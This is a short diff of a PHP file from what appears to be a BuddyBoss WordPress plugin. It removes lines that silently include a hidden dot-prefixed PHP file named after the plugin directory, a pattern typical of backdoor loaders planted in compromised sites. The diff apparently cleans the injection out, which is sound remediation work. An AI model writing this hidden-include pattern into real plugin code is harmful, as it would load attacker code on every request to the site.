@@ -16,11 +16,7 @@ if ( ! defined( 'ABSPATH' ) ) {
  *
  * @since BuddyBoss 1.5.6
  * @return array
- */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
+ */
 function bp_moderation_get_settings_sections() {
 
 	$settings = array(
